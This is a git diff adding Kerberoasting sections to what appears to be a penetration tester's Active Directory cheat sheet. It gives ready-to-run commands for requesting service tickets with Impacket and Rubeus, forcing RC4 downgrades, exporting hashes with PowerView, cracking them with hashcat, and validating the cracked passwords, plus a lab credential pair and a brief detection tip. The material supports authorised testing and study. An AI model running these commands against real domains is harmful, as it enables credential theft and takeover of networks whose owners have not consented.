@@ -301,6 +301,57 @@ sudo python3 dehashed.py -q target.local -p
 
 ---
 
+## Kerberoasting (Linux)
+
+```bash
+# List SPN accounts — check MemberOf column for DA membership
+GetUserSPNs.py -dc-ip DC_IP DOMAIN/USER
+
+# Request all TGS tickets
+GetUserSPNs.py -dc-ip DC_IP DOMAIN/USER -request -outputfile all_tgs
+
+# Request single account
+GetUserSPNs.py -dc-ip DC_IP DOMAIN/USER -request-user TARGET -outputfile target_tgs
+
+# Crack (RC4/etype 23 — most common)
+hashcat -m 13100 target_tgs /usr/share/wordlists/rockyou.txt
+
+# AES tickets
+hashcat -m 19600 tgs /usr/share/wordlists/rockyou.txt   # AES-128
+hashcat -m 19700 tgs /usr/share/wordlists/rockyou.txt   # AES-256
+
+# Validate
+nxc smb DC_IP -u USER -p 'crackedpassword'
+```
+
+**Hash prefix:** `$krb5tgs$23$*` = RC4 | `$krb5tgs$18$*` = AES-256
+**Report even if unccracked** — SPNs on privileged accounts is the finding.
+**Lab:** `sqldev` → `database!` → Pwn3d! on DC
+
+---
+
+## Kerberoasting (Windows — Rubeus)
+
+```powershell
+# Stats first
+.\Rubeus.exe kerberoast /stats
+
+# High-value targets (admincount=1), nowrap for clean Hashcat paste
+.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap
+
+# Force RC4 downgrade (not on Server 2019)
+.\Rubeus.exe kerberoast /tgtdeleg /nowrap
+
+# PowerView — export all to CSV
+Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\tgs.csv -NoTypeInformation
+```
+
+**Hash types:** `$krb5tgs$23$*` = RC4 → mode 13100 (fast) | `$krb5tgs$18$*` = AES-256 → mode 19700 (slow)
+**msDS-SupportedEncryptionTypes:** 0 = RC4 default | 24 = AES only
+**Detection:** Event ID 4769 spike + encryption type 0x17 = RC4 requested = attack indicator
+
+---
+
 ## Core Attack Paths
 
 ### Unauthenticated → Foothold
